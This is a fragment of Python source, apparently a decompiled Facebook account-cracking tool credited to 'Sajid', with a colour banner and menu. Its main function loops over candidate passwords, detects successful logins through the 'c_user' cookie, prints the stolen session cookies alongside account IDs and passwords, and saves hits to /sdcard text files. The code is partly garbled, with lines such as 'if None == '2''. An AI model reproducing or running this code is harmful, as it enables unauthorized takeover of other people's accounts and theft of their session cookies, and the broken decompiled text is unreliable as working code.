...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://github.com/KgSajidn')
        return None
    if None == '4':
...
\033[1;96.
 ...
 \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mSajid  \033[1;92m|
 \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m Sajid              \033[1;92m|
 \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35mKgSajid             \033[1;92m|
...
def i():
    ...
    print('IDS SAVED IN SajidN.txt, SajidN.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32mSajid-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/Sajid-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mSajid-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Sajid-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[Sajid] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
